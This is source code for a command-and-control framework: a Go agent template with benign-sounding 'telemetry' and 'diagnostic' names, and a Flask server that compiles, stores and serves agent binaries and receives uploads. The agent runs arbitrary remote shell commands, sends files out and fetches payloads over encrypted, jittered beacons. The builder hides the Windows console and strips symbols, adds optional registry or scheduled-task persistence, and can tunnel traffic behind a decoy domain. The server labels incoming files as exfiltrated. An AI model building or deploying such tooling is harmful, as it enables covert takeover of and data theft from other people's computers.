	"os"
	"runtime"
	"strings"

	"endpoint-telemetry/funcs"
)

type DeviceTelemetryPayload struct {{
	EndpointID  string `json:"agent_id"`
	AgentSecret string `json:"agent_secret"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}}

type SyncResponse struct {{
	Status string          `json:"status"`
	Jobs   []DiagnosticJob `json:"tasks"`
}}

type DiagnosticJob struct {{
	ID      int    `json:"id"`
	Command string `json:"command"`
	Type    string `json:"type"`
}}

type DiagnosticOutput struct {{
	JobID int    `json:"task_id"`
	EndpointID string `json:"agent_id"`
	AgentSecret string `json:"agent_secret"`
	ReportID string `json:"report_id"`
	Output string `json:"output"`
}}

type ResultAcknowledgement struct {{
	Status string `json:"status"`
	EndpointID string `json:"agent_id"`
	JobID int `json:"task_id"`
	ReportID string `json:"report_id"`
	OutputSHA256 string `json:"output_sha256"`
	AlreadyRecorded bool `json:"already_recorded"`
}}

func main() {{
	if err := acquireAgentProcessLock(); err != nil {{
		return
	}}
	defer func() {{ _ = releaseAgentProcessLock(false) }}()

	InitializeTelemetry()
	if err := initializeDurableResultState(); err != nil {{
		return
	}}
	if resumePendingCleanup() {{
		return
	}}
{persist_block}
	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	for {{
		retryQueuedResults()
		jobs, err := SyncDeviceState(hostname, agentOS)
		if err != nil {{
			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
			continue
		}}

		for _, job := range jobs {{
			if job.Command == FlushCommand {{
				submitResultWithRetry(job.ID, "Cache flush acknowledged. Cleaning up…", true)
				continue
			}}

			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
			if funcs.IsPathUpdate(job.Command) {{
				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
				if cdErr != nil {{
					output = fmt.Sprintf("Error: %v", cdErr)
				}}
				submitResultWithRetry(job.ID, output, false)
				continue
			}}

			if strings.HasPrefix(job.Command, "get ") {{
				go func(t DiagnosticJob) {{
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, AgentSecret, filePath, KeyID, EncryptionKey)
					if err != nil {{
						output = fmt.Sprintf("Upload error: %v", err)
					}}
					submitResultWithRetry(t.ID, output, false)
				}}(job)
				continue
			}}

			if strings.HasPrefix(job.Command, "download ") {{
				go func(t DiagnosticJob) {{
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {{
						submitResultWithRetry(t.ID, "Usage: download <file_id> <save_path>", false)
						return
					}}
					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]), EndpointID, AgentSecret, t.ID)
					if err != nil {{
						output = fmt.Sprintf("Download error: %v", err)
					}}
					submitResultWithRetry(t.ID, output, false)
				}}(job)
				continue
			}}

			go func(t DiagnosticJob) {{
				var output string
				var execErr error

				switch t.Type {{
				case "exec":
					output, execErr = funcs.RunDiagnosticProbe(t.Command)
				default:
					output, execErr = funcs.ExecuteDiagnosticTask(t.Command)
				}}

				if execErr != nil && output == "" {{
					output = fmt.Sprintf("Error: %v", execErr)
				}}
				submitResultWithRetry(t.ID, output, false)
			}}(job)
		}}

		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
	}}
}}

func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {{
	payload := DeviceTelemetryPayload{{
		EndpointID:  EndpointID,
		AgentSecret: AgentSecret,
		Hostname: hostname,
		OS:       agentOS,
	}}

	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
	if err != nil {{
		return nil, err
	}}

	// Unwrap the encrypted response envelope
	var envelope struct {{
		Data string `json:"data"`
	}}
	if err := json.Unmarshal(respBody, &envelope); err != nil {{
		return nil, fmt.Errorf("envelope unmarshal: %w", err)
	}}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {{
		return nil, fmt.Errorf("decrypt checkin response: %w", err)
	}}

	var result SyncResponse
	if err := json.Unmarshal(plain, &result); err != nil {{
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}}
	return result.Jobs, nil
}}

func SubmitDiagnosticReport(jobID int, output, reportID string) error {{
	// encoding/json replaces invalid UTF-8 in strings. Normalize first so the
	// payload and the acknowledgement digest always describe identical bytes.
	output = string([]rune(output))
	payload := DiagnosticOutput{{
		JobID: jobID,
		EndpointID: EndpointID,
		AgentSecret: AgentSecret,
		ReportID: reportID,
		Output: output,
	}}
	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
	if err != nil {{
		return err
	}}

	var envelope struct {{
		KeyID string `json:"kid"`
		Data string `json:"data"`
	}}
	if err := json.Unmarshal(respBody, &envelope); err != nil {{
		return fmt.Errorf("result acknowledgement envelope: %w", err)
	}}
	if envelope.KeyID != KeyID || envelope.Data == "" {{
		return fmt.Errorf("result acknowledgement envelope does not match this build")
	}}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {{
		return fmt.Errorf("authenticate result acknowledgement: %w", err)
	}}
	var acknowledgement ResultAcknowledgement
	if err := json.Unmarshal(plain, &acknowledgement); err != nil {{
		return fmt.Errorf("decode result acknowledgement: %w", err)
	}}
	digest := sha256.Sum256([]byte(output))
	expectedDigest := hex.EncodeToString(digest[:])
	if acknowledgement.Status != "ok" ||
		acknowledgement.EndpointID != EndpointID ||
		acknowledgement.JobID != jobID ||
		acknowledgement.ReportID != reportID ||
		acknowledgement.OutputSHA256 != expectedDigest {{
		return fmt.Errorf("result acknowledgement does not match the submitted result")
	}}
	return nil
}}

// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
// wraps the ciphertext in a {{kid, data}} envelope, and POSTs it.
// Returns the raw response body so the caller can decrypt if needed.
func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
	inner, err := json.Marshal(payload)
	if err != nil {{
		return nil, fmt.Errorf("marshal: %w", err)
	}}

	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
	if err != nil {{
		return nil, fmt.Errorf("encrypt: %w", err)
	}}

	envelope := map[string]string{{"kid": KeyID, "data": enc}}
	body, err := json.Marshal(envelope)
	if err != nil {{
		return nil, fmt.Errorf("envelope marshal: %w", err)
	}}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {{
		return nil, fmt.Errorf("post: %w", err)
	}}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {{
		return nil, fmt.Errorf("read response: %w", err)
	}}

	if resp.StatusCode != 200 {{
		bodyStr := string(respBody)
		if resp.StatusCode == 410 ||
			(resp.StatusCode == 403 && strings.Contains(bodyStr, "Invalid agent identity")) {{
			return nil, &errAgentIdentityGone{{StatusCode: resp.StatusCode, Body: bodyStr}}
		}}
		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, bodyStr)
	}}

	return respBody, nil
}}

'''


@app.route("/api/build", methods=["POST"])
def build_agent():
    """Compile an agent binary with the given config and return the build ID."""
    data = request.get_json()

    if not isinstance(data, dict) or not data:
        return jsonify({"error": "Missing request body"}), 400

    target_os = data.get("target_os", "windows")
    arch = data.get("arch", "amd64")
    server_url = data.get("server_url", "http://localhost:5000")
    jitter_min_raw = data.get("jitter_min", "8")
    jitter_max_raw = data.get("jitter_max", "15")
    persist_method = data.get("persist_method", "none")
    valid_persist = ("none", "registry", "scheduled_task")
    if persist_method not in valid_persist:
        return jsonify({"error": f"persist_method must be one of: {', '.join(valid_persist)}"}), 400
    profile_id = data.get("profile_id", 1)
    locale = data.get("locale", "en-US,en;q=0.9")

    # Transport mode
    transport_mode = data.get("transport_mode", "http")
    valid_transport = ("http", "https_pinned", "reality")
    if transport_mode not in valid_transport:
        return jsonify({"error": f"transport_mode must be one of: {', '.join(valid_transport)}"}), 400

    required_fields = ("target_os", "arch", "jitter_min", "jitter_max", "persist_method")
    if transport_mode != "reality":
        required_fields += ("server_url",)
    missing = [field for field in required_fields if field not in data]
    if missing:
        return jsonify({"error": "Missing required build fields: " + ", ".join(missing)}), 400

    # REALITY-specific params (only required when transport_mode is "reality")
    reality_vps_addr = data.get("reality_vps_addr", "")
    decoy_domain = data.get("decoy_domain", "")
    reality_pubkey = data.get("reality_pubkey", "")
    reality_shortid = data.get("reality_shortid", "")
    vless_uuid = data.get("vless_uuid", "")

    for field, value in (("server_url", server_url), ("locale", locale),
                         ("reality_vps_addr", reality_vps_addr), ("decoy_domain", decoy_domain),
                         ("reality_pubkey", reality_pubkey), ("reality_shortid", reality_shortid),
                         ("vless_uuid", vless_uuid)):
        if not isinstance(value, str):
            return jsonify({"error": f"{field} must be a string"}), 400
    for field, value in (("jitter_min", jitter_min_raw), ("jitter_max", jitter_max_raw),
                         ("profile_id", profile_id)):
        if isinstance(value, bool) or not isinstance(value, (int, str)):
            return jsonify({"error": f"{field} must be an integer"}), 400
        if isinstance(value, str) and not value.isdecimal():
            return jsonify({"error": f"{field} must be an integer"}), 400

    # Validate target OS
    valid_os = ["windows", "linux", "mac"]
    if target_os not in valid_os:
        return jsonify({"error": f"Invalid target_os. Must be one of: {valid_os}"}), 400

    # macOS has no persistence implementation; reject at build time rather than silently failing at runtime
    if target_os == "mac" and persist_method != "none":
        return jsonify({"error": "macOS agents do not support persistence. Set persist_method to 'none'."}), 400

    valid_arch_by_os = {
        "windows": ("amd64", "arm64", "386"),
        "linux": ("amd64", "arm64", "386"),
        "mac": ("amd64", "arm64"),
    }
    valid_arch = valid_arch_by_os[target_os]
    if arch not in valid_arch:
        return jsonify({
            "error": f"Invalid arch for {target_os}. Must be one of: {list(valid_arch)}"
        }), 400

    # Parse jitter_min
    try:
        jitter_min = int(jitter_min_raw)
        if jitter_min < 1 or jitter_min > 3600:
            return jsonify({"error": "jitter_min must be between 1 and 3600 seconds"}), 400
    except (ValueError, TypeError):
        return jsonify({"error": "jitter_min must be a number (seconds)"}), 400

    # Parse jitter_max
    try:
        jitter_max = int(jitter_max_raw)
        if jitter_max < 1 or jitter_max > 3600:
            return jsonify({"error": "jitter_max must be between 1 and 3600 seconds"}), 400
    except (ValueError, TypeError):
        return jsonify({"error": "jitter_max must be a number (seconds)"}), 400

    if jitter_min >= jitter_max:
        return jsonify({"error": "jitter_min must be less than jitter_max"}), 400

    # -- Transport-specific validation --

    cert_pin = None

    if transport_mode == "reality":
        # REALITY mode: validate all 5 REALITY credentials
        if not all([reality_vps_addr, decoy_domain, reality_pubkey, reality_shortid, vless_uuid]):
            return jsonify({"error": "REALITY mode requires: reality_vps_addr, decoy_domain, reality_pubkey, reality_shortid, vless_uuid"}), 400

        # VPS address must be host:port
        if ":" not in reality_vps_addr:
            return jsonify({"error": "reality_vps_addr must be in host:port format (e.g. 1.2.3.4:443)"}), 400

        # Public key must base64-decode to exactly 32 bytes (X25519)
        try:
            import base64 as _b64
            try:
                pk_bytes = _b64.urlsafe_b64decode(reality_pubkey + "==")
            except Exception:
                pk_bytes = _b64.b64decode(reality_pubkey + "==")
            if len(pk_bytes) != 32:
                return jsonify({"error": f"reality_pubkey must decode to 32 bytes (X25519), got {len(pk_bytes)}"}), 400
        except Exception:
            return jsonify({"error": "reality_pubkey must be valid base64url-encoded X25519 public key"}), 400

        # Short ID must hex-decode to ≤8 bytes
        try:
            sid_bytes = bytes.fromhex(reality_shortid)
            if len(sid_bytes) > 8:
                return jsonify({"error": f"reality_shortid must be ≤8 bytes when hex-decoded, got {len(sid_bytes)}"}), 400
        except ValueError:
            return jsonify({"error": "reality_shortid must be valid hex"}), 400

        # VLESS UUID format check
        import re as _re_uuid
        uuid_pattern = r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
        if not _re_uuid.match(uuid_pattern, vless_uuid):
            return jsonify({"error": "vless_uuid must be a valid UUID (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)"}), 400

        # The inner HTTP destination is the Flask service behind Xray.
        server_url = "http://127.0.0.1:5000"

    elif transport_mode == "https_pinned":
        # Validate server URL
        if not server_url.startswith("https://"):
            return jsonify({"error": "HTTPS+pinned mode requires an https:// server URL"}), 400

        # For HTTPS builds, read the cert and compute the pin to bake into the binary.
        cert_pin = _compute_cert_pin()
        if cert_pin is None:
            return jsonify({"error": "Server URL is HTTPS but no certificate found in server/certs/. Run gen_cert.py first."}), 400

    else:
        # HTTP mode
        if not server_url.startswith("http://") and not server_url.startswith("https://"):
            return jsonify({"error": "Server URL must start with http:// or https://"}), 400

        # Still support auto-pin for http mode with https:// URL (backward compat)
        if server_url.startswith("https://"):
            cert_pin = _compute_cert_pin()
            if cert_pin is None:
                return jsonify({"error": "Server URL is HTTPS but no certificate found in server/certs/. Run gen_cert.py first."}), 400
            # Normalize: a build with a cert pin IS an https_pinned build,
            # regardless of what the UI submitted. This keeps stored metadata
            # truthful so badges agree across build list and agent cards.
            transport_mode = "https_pinned"

    # Validate profile_id
    try:
        profile_id = int(profile_id)
        if profile_id < 1 or profile_id > 5:
            return jsonify({"error": "profile_id must be between 1 and 5"}), 400
    except (ValueError, TypeError):
        return jsonify({"error": "profile_id must be a number (1-5)"}), 400

    # basic locale format check
    import re as _re
    if not _re.match(r'^[a-zA-Z0-9\-,;=. ]+$', locale):
        return jsonify({"error": "Invalid locale format"}), 400

    # Build filename
    ext = ".exe" if target_os == "windows" else ""
    filename = f"agent_{target_os}_{arch}{ext}"

    # Create temp directory for the build
    tmp_dir = tempfile.mkdtemp(prefix="c2_build_")

    created_artifact = None
    try:
        # Copy agent source to temp directory
        agent_src = os.path.abspath(AGENT_SRC_DIR)
        tmp_agent = os.path.join(tmp_dir, "agent")
        shutil.copytree(agent_src, tmp_agent)

        # Generate unique key for this build
        conn = get_db_connection()
        while True:
            key_hex, key_id = generate_key()
            existing = conn.execute("SELECT 1 FROM builds WHERE key_id = ?", (key_id,)).fetchone()
            if not existing:
                break
        conn.close()

        # Generate custom config.go
        config_content = _generate_config_go(
            server_url, jitter_min, jitter_max, persist_method, profile_id, locale,
            key_hex=key_hex, key_id=key_id,
            path_checkin=AGENT_PATH_CHECKIN,
            path_result=AGENT_PATH_RESULT,
            path_upload=AGENT_PATH_UPLOAD,
            path_files=AGENT_PATH_FILES + "/",
            cert_pin=cert_pin or "",
            transport_mode=transport_mode,
            reality_vps_addr=reality_vps_addr,
            decoy_domain=decoy_domain,
            reality_pubkey=reality_pubkey,
            reality_shortid=reality_shortid,
            vless_uuid=vless_uuid,
        )
        with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
            f.write(config_content)

        # Generate main.go with optional persistence
        main_content = _generate_main_go(persist_method)
        with open(os.path.join(tmp_agent, "main.go"), "w", encoding="utf-8") as f:
            f.write(main_content)

        # Build the binary
        output_path = os.path.join(tmp_dir, filename)
        env = os.environ.copy()
        env["GOOS"] = "darwin" if target_os == "mac" else target_os
        env["GOARCH"] = arch
        env["CGO_ENABLED"] = "0"

        # strip debug symbols and DWARF
        ldflags = "-s -w"

        # no console window on Windows
        if target_os == "windows":
            ldflags += " -H=windowsgui"

        ldflags += " -buildid="

        result = subprocess.run(
            ["go", "build", "-buildvcs=false", "-trimpath", "-ldflags", ldflags, "-o", output_path, "."],
            cwd=tmp_agent,
            env=env,
            capture_output=True,
            text=True,
            timeout=120,
        )

        if result.returncode != 0:
            error_msg = result.stderr or result.stdout or "Unknown build error"
            return jsonify({"error": f"Build failed: {error_msg}"}), 500

        # Reserve the final name exclusively, even across concurrent requests.
        name, extension = os.path.splitext(filename)
        for _ in range(20):
            candidate = f"{name}_{os.urandom(8).hex()}{extension}"
            final_path = os.path.join(BUILDS_DIR, candidate)
            try:
                fd = os.open(final_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o700)
                created_artifact = final_path
                filename = candidate
                break
            except FileExistsError:
                continue
        else:
            raise OSError("Could not allocate a unique build artifact name")
        try:
            with open(output_path, "rb") as source, os.fdopen(fd, "wb") as destination:
                shutil.copyfileobj(source, destination)
                destination.flush()
                os.fsync(destination.fileno())
        except Exception:
            # fdopen owns fd after success; close it if opening the source failed.
            try:
                os.close(fd)
            except OSError:
                pass
            raise
        os.chmod(final_path, 0o700)
        file_size = os.path.getsize(final_path)

        # save build record
        conn = get_db_connection()
        try:
            cursor = conn.execute(
                "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key, cert_pin, transport_mode, decoy_domain) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", persist_method, final_path, file_size, key_id, key_hex, cert_pin, transport_mode, decoy_domain or None),
            )
            build_id = cursor.lastrowid
            conn.commit()
        finally:
            conn.close()
        created_artifact = None

        return jsonify({
            "status": "ok",
            "build_id": build_id,
            "filename": filename,
            "file_size": file_size,
            "transport_mode": transport_mode,
            "tls_pinned": cert_pin is not None,
            "cert_pin_prefix": cert_pin[:16] + "..." if cert_pin else None,
            "decoy_domain": decoy_domain or None,
        })

    except subprocess.TimeoutExpired:
        return jsonify({"error": "Build timed out (120s limit)"}), 500
    except Exception as e:
        return jsonify({"error": f"Build error: {str(e)}"}), 500
    finally:
        if created_artifact is not None:
            try:
                os.remove(created_artifact)
            except FileNotFoundError:
                pass
            except OSError:
                app.logger.exception("Could not clean up unrecorded build artifact: %s", created_artifact)
        # Clean up temp directory
        shutil.rmtree(tmp_dir, ignore_errors=True)


@app.route("/api/reality/check-domain", methods=["POST"])
def check_decoy_domain():
    """Estimate whether a public site's certificate record fits REALITY's limit."""
    data = request.get_json()
    if not isinstance(data, dict) or "domain" not in data:
        return jsonify({"error": "Missing 'domain' field"}), 400
    import socket
    import ssl
    try:
        cert_bytes = measure_certificate_record(data["domain"])
        return jsonify({
            "ok": True,
            "size_bytes": cert_bytes,
            "limit_bytes": REALITY_CERTIFICATE_LIMIT_BYTES,
            "fits": cert_bytes <= REALITY_CERTIFICATE_LIMIT_BYTES,
        })
    except ProbeInputError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    except ProbeDenied as exc:
        return jsonify({"ok": False, "error": str(exc)}), 403
    except socket.timeout:
        return jsonify({"ok": False, "error": "Certificate measurement timed out."}), 504
    except socket.gaierror:
        return jsonify({"ok": False, "error": "DNS resolution failed for this domain."}), 502
    except ssl.SSLError:
        return jsonify({"ok": False, "error": "The TLS handshake failed."}), 502
    except OSError:
        return jsonify({"ok": False, "error": "Could not measure the site's certificate."}), 502


@app.route("/api/tls/status", methods=["GET"])
def tls_status():
    """Read the cert on disk and return its details plus the SPKI pin."""
    cert_path, key_path = _active_tls_paths()

    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        return jsonify({"enabled": False, "cert": None})

    from cryptography.x509 import load_pem_x509_certificate
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    import hashlib

    with open(cert_path, "rb") as f:
        cert = load_pem_x509_certificate(f.read())

    spki_bytes = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    pin = hashlib.sha256(spki_bytes).hexdigest()

    san_list = []
    try:
        from cryptography.x509.extensions import SubjectAlternativeName
        from cryptography.x509 import DNSName, IPAddress
        san_ext = cert.extensions.get_extension_for_class(SubjectAlternativeName)
        for name in san_ext.value:
            if isinstance(name, DNSName):
                san_list.append({"type": "dns", "value": name.value})
            elif isinstance(name, IPAddress):
                san_list.append({"type": "ip", "value": str(name.value)})
    except Exception:
        pass

    return jsonify({
        "enabled": True,
        "cert": {
            "cn": cert.subject.get_attributes_for_oid(
                __import__("cryptography.x509.oid", fromlist=["NameOID"]).NameOID.COMMON_NAME
            )[0].value,
            "not_valid_before": cert.not_valid_before_utc.isoformat(),
            "not_valid_after":  cert.not_valid_after_utc.isoformat(),
            "serial": str(cert.serial_number),
            "san": san_list,
            "spki_pin": pin,
        },
    })


@app.route("/api/tls/generate", methods=["POST"])
def tls_generate():
    """Generate, validate, and atomically publish a self-signed PEM bundle."""
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return jsonify({"error": "Request body must be a valid JSON object"}), 400

    cn = data.get("cn", "localhost")
    san_ips = data.get("san_ips", [])
    san_dns = data.get("san_dns", [])
    days_raw = data.get("days", 365)
    if not isinstance(cn, str):
        return jsonify({"error": "cn must be a string"}), 400
    if (not isinstance(san_ips, list) or not all(isinstance(s, str) for s in san_ips) or
            not isinstance(san_dns, list) or not all(isinstance(s, str) for s in san_dns)):
        return jsonify({"error": "san_ips and san_dns must be lists of strings"}), 400
    if isinstance(days_raw, bool) or not isinstance(days_raw, (int, str)) or (isinstance(days_raw, str) and not days_raw.isdecimal()):
        return jsonify({"error": "days must be an integer"}), 400
    try:
        days = int(days_raw)
    except ValueError:
        return jsonify({"error": "days must be an integer between 1 and 3650"}), 400
    cn = cn.strip()
    san_ips = [s.strip() for s in san_ips if s.strip()]
    san_dns = [s.strip() for s in san_dns if s.strip()]

    if not cn:
        return jsonify({"error": "cn is required"}), 400
    if days < 1 or days > 3650:
        return jsonify({"error": "days must be between 1 and 3650"}), 400

    import ipaddress
    for ip in san_ips:
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return jsonify({"error": f"Invalid IP address: {ip}"}), 400

    # Import cert generation deps inline so gen_cert.py stays a standalone script.
    import datetime, hashlib, ipaddress as _ipaddress
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    # Validate user-controlled X.509 values before generating a key or touching
    # the active certificate. The library enforces the CN's encoded byte limit.
    try:
        subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    except ValueError as exc:
        return jsonify({"error": f"Invalid cn: {exc}"}), 400
    try:
        san_entries = [x509.DNSName(dns_name) for dns_name in san_dns]
        if cn not in san_dns:
            san_entries.insert(0, x509.DNSName(cn))
    except ValueError as exc:
        return jsonify({"error": f"Invalid DNS name in cn or san_dns: {exc}"}), 400
    for ip_str in san_ips:
        san_entries.append(x509.IPAddress(_ipaddress.ip_address(ip_str)))

    certs_dir = CERTS_DIR
    os.makedirs(certs_dir, exist_ok=True)
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=days))
        .add_extension(x509.SubjectAlternativeName(san_entries), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )

    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    key_pem = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )
    publish_certificate_bundle(certs_dir, cert_pem, key_pem)

    spki_bytes = cert.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    pin = hashlib.sha256(spki_bytes).hexdigest()

    return jsonify({
        "status": "ok",
        "spki_pin": pin,
        "not_valid_after": cert.not_valid_after_utc.isoformat(),
        "restart_required": True,
    })


@app.route("/api/tls/delete", methods=["DELETE"])
def tls_delete():
    """Remove the cert and key files from disk. Server falls back to HTTP on next restart."""
    certs_dir = CERTS_DIR
    cert_path = os.path.join(certs_dir, "server.crt")
    key_path  = os.path.join(certs_dir, "server.key")

    removed = []
    bundle_path = os.path.join(certs_dir, "server.pem")
    # Remove legacy fallback first; the active bundle remains available if this fails.
    for p, label in [(cert_path, "server.crt"), (key_path, "server.key")]:
        if os.path.exists(p):
            os.remove(p)
            removed.append(label)
    if os.path.exists(bundle_path):
        os.remove(bundle_path)
        removed.append("server.pem")

    if not removed:
        return jsonify({"error": "No certificate files found"}), 404

    return jsonify({"status": "ok", "removed": removed, "restart_required": True})


@app.route("/api/builds", methods=["GET"])
def get_builds():
    """Return all builds as JSON."""
    conn = get_db_connection()
    builds = conn.execute("SELECT * FROM builds ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "builds": [
            {
                "id": b["id"],
                "filename": b["filename"],
                "target_os": b["target_os"],
                "arch": b["arch"],
                "server_url": b["server_url"],
                "callback_interval": b["callback_interval"],
                "persistence": b["persistence"] if b["persistence"] in ("none", "registry", "scheduled_task") else ("registry" if b["persistence"] else "none"),
                "file_size": b["file_size"],
                "cert_pin": b["cert_pin"],
                "transport_mode": b["transport_mode"] or "http",
                "decoy_domain": b["decoy_domain"],
                "created_at": b["created_at"],
            }
            for b in builds
        ]
    })


@app.route("/api/builds/download/<int:build_id>", methods=["GET"])
def download_build(build_id):
    """Download a built agent binary."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
    conn.close()

    if not build:
        return jsonify({"error": "Build not found"}), 404

    file_path = build["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "Build file not found on disk"}), 404

    filename = build["filename"]
    with open(file_path, "rb") as f:
        binary_data = f.read()

    response = Response(binary_data, mimetype="application/octet-stream")
    response.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
    response.headers["Content-Length"] = str(len(binary_data))
    return response


@app.route("/api/builds/<int:build_id>", methods=["DELETE"])
def delete_build(build_id):
    """Delete a build and its file."""
    conn = get_db_connection()
    try:
        # Serialize reference checks with writes even on migrated databases
        # that cannot enforce the new foreign key.
        conn.execute("BEGIN IMMEDIATE")
        build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
        if not build:
            return jsonify({"error": "Build not found"}), 404

        # Apply the same policy to fresh databases (with a foreign key) and
        # migrated databases (whose added build_id column lacks that key).
        linked = conn.execute(
            "SELECT 1 FROM agents WHERE build_id = ? OR "
            "((build_id IS NULL OR build_id = 0) AND key_id = ?) LIMIT 1",
            (build_id, build["key_id"]),
        ).fetchone()
        if linked:
            return jsonify({"error": "Build is referenced by registered agents"}), 409

        # Record the cleanup in the same transaction as the row deletion.
        # A crash or unlink failure after commit can then be retried safely.
        file_path = build["file_path"]
        if not _is_managed_build_artifact(file_path):
            return jsonify({"error": "Build artifact is outside the managed directory"}), 500
        shared = conn.execute(
            "SELECT 1 FROM builds WHERE file_path = ? AND id != ? LIMIT 1",
            (file_path, build_id),
        ).fetchone()
        if shared:
            return jsonify({"error": "Build artifact is referenced by another build"}), 409
        cleanup_id = conn.execute(
            "INSERT INTO build_cleanup_queue (file_path) VALUES (?)", (file_path,)
        ).lastrowid
        conn.execute("DELETE FROM builds WHERE id = ?", (build_id,))
        conn.execute(
            "DELETE FROM seen_nonces WHERE kid = ? AND NOT EXISTS "
            "(SELECT 1 FROM builds WHERE key_id = ?)",
            (build["key_id"], build["key_id"]),
        )
        conn.commit()
        if not _remove_queued_build_artifact(conn, cleanup_id, file_path):
            return jsonify({"error": "Build record deleted; artifact cleanup queued for retry on restart"}), 500
        return jsonify({"status": "ok"})
    except sqlite3.IntegrityError:
        conn.rollback()
        return jsonify({"error": "Build is referenced by registered agents"}), 409
    finally:
        conn.close()


def _is_managed_build_artifact(file_path):
    if not isinstance(file_path, str) or not os.path.isabs(file_path):
        return False
    managed_dir = os.path.realpath(BUILDS_DIR)
    return (os.path.dirname(os.path.realpath(file_path)) == managed_dir and
            not os.path.islink(file_path))


def _remove_queued_build_artifact(conn, cleanup_id, file_path):
    """Remove one committed build artifact without following paths outside BUILDS_DIR."""
    if not _is_managed_build_artifact(file_path):
        app.logger.error("Refusing build cleanup outside managed directory: %s", file_path)
        return False
    if conn.execute("SELECT 1 FROM builds WHERE file_path = ? LIMIT 1", (file_path,)).fetchone():
        app.logger.error("Refusing build cleanup for an artifact still referenced by a build")
        return False
    try:
        os.remove(file_path)
    except FileNotFoundError:
        pass  # A previous attempt removed it before losing the queue acknowledgement.
    except OSError:
        app.logger.exception("Could not remove queued build artifact: %s", file_path)
        return False
    conn.execute("DELETE FROM build_cleanup_queue WHERE id = ?", (cleanup_id,))
    conn.commit()
    return True


def retry_queued_build_cleanup():
    """Retry committed artifact deletions left by a crash or filesystem error."""
    conn = get_db_connection()
    try:
        rows = conn.execute("SELECT id, file_path FROM build_cleanup_queue ORDER BY id").fetchall()
        for row in rows:
            try:
                _remove_queued_build_artifact(conn, row["id"], row["file_path"])
            except sqlite3.Error:
                app.logger.exception("Could not acknowledge build cleanup %s", row["id"])
                conn.rollback()
    finally:
        conn.close()


# Agent uploads.

def receive_upload():
    """Receive an exfiltrated file from an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400
    if "auth" not in request.form:
        return jsonify({"error": "Missing auth"}), 400

    file = request.files["file"]

    try:
        envelope = json.loads(request.form["auth"])
        kid = envelope["kid"]
        data = envelope["data"]
    except (ValueError, KeyError, TypeError):
        return jsonify({"error": "Invalid auth"}), 400

    try:
        nonce_hex = base64.b64decode(data)[:12].hex()
    except Exception:
        return jsonify({"error": "Invalid payload"}), 400

    meta, key_hex, _ = _decrypt_with_kid(kid, data)
    if meta is None or key_hex is None:
        candidate_builds = _get_builds_for_kid(kid)
        if not candidate_builds:
            return jsonify({"error": "Unknown key"}), 403
        return jsonify({"error": "Decryption failed"}), 403

    if not isinstance(meta, dict):
        return jsonify({"error": "Invalid upload identity"}), 400
    conn = get_db_connection()
    if not _agent_authenticated(conn, meta.get("agent_id"), meta.get("agent_secret"), kid):
        conn.close()
        return jsonify({"error": "Invalid agent identity"}), 403

